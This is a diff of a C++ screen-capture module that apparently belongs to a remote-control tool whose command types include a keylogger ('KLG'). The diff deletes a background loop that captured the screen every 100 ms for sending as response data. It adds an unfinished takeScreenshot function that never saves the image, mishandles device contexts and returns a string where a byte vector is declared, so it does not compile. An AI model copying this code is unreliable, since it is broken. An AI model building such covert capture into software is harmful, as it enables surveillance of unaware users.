@@ -1,78 +1,48 @@
 #include "SCR_Func.h"
+#include <windows.h>
+#include <tlhelp32.h>
+#include <vector>
+#include <string>
+#include <sstream>
+#include <d3d9.h>
+#include <wincodec.h>
+#include <wingdi.h>
+#include <Windows.h>
+#include <gdiplus.h>
+#pragma comment(lib, "Gdi32.lib")
+#pragma comment(lib, "Gdiplus.lib")
 
 
-bool SCR_Func::capturing = false;
-std::vector<char> SCR_Func::screenData;
-
-void SCR_Func::captureLoop()
+std::vector<char> SCR_Func::takeScreenshot()
 {
-    while (capturing) {
-        // Get the device context of the screen
-        HDC hScreenDC = GetDC(NULL);
-        // Create a compatible device context
-        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+	HDC hScreenDC = GetDC(nullptr); // CreateDC("DISPLAY",nullptr,nullptr,nullptr);
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
 
-        // Get the width and height of the screen
-        int width = GetDeviceCaps(hScreenDC, HORZRES);
-        int height = GetDeviceCaps(hScreenDC, VERTRES);
-
-        // Create a compatible bitmap
-        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
-        // Select the bitmap into the memory device context
-        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
-
-        // Bit-block  from the screen device context to the memory device context
-        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
-        // Select the old bitmap back into the memory device context
-        SelectObject(hMemoryDC, hOldBitmap);
-
-        // Save the bitmap to a vector of char
-        BITMAPINFOHEADER bi;
-        bi.biSize = sizeof(BITMAPINFOHEADER);
-        bi.biWidth = width;
-        bi.biHeight = -height;
-        bi.biPlanes = 1;
-        bi.biBitCount = 32;
-        bi.biCompression = BI_RGB;
-        bi.biSizeImage = 0;
-        bi.biXPelsPerMeter = 0;
-        bi.biYPelsPerMeter = 0;
-        bi.biClrUsed = 0;
-        bi.biClrImportant = 0;
-
-        DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
-        screenData.resize(dwBmpSize);
-        GetDIBits(hMemoryDC, hBitmap, 0, height, &screenData[0], (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-
-        std::shared_ptr<DataObj> mes(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::SCR, CmdType::DATA, screenData));
+	// Get width and height of the current screen
+	int width = GetDeviceCaps(hScreenDC, HORZRES);
+	int height = GetDeviceCaps(hScreenDC, VERTRES);
 
 
-        // Clean up
-        DeleteObject(hBitmap);
-        DeleteDC(hMemoryDC);
-        ReleaseDC(NULL, hScreenDC);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
+	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));
+	DeleteDC(hMemoryDC);
+	DeleteDC(hScreenDC);
 
-        // Sleep for a while before capturing again
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    }
-}
+	// Initialize GDI+
+	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+	ULONG_PTR gdiplusToken;
+	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
 
-std::shared_ptr<DataObj> SCR_Func::startCapture()
-{
-    capturing = true;
-    std::string res = "Start capturing... \n";
-    std::thread captureThread(captureLoop);
-    captureThread.detach();
-    std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::SCR, CmdType::START, res));
+	// Save the bitmap to a file
+	Gdiplus::Bitmap bitmap(hBitmap, nullptr);
+	CLSID clsid;
+	CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid); // PNG encoder
+	
 
-    return MES;
-}
 
-std::shared_ptr<DataObj> SCR_Func::stopCapture()
-{
-    capturing = false;
-    std::string res = "Capture stop \n";
-    std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::STOP, res));
 
-    return MES;
+
+	return " ";
 }
